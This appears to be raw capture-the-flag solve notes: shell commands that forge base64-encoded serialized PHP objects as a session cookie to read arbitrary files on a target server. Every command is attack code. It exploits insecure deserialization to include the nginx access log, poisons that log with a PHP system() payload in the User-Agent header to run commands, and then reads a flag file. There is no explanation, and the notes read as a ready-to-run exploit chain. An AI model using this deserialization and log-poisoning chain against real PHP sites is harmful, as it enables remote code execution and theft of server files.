````bash
echo 'Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9' | base64 -d
````

````bash
echo 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64
````
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=

curl --location --request GET 'http://178.128.160.242:31782/' \
--header 'User-Agent: <?php system('\''ls /'\'');?>' \
--header 'Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo='

````bash
echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/flag_1Lgjj";}' | base64
````
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfMUxnamoiO30K

curl --location --request GET 'http://178.128.160.242:31782/' \
--header 'Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfMUxnamoiO30K'

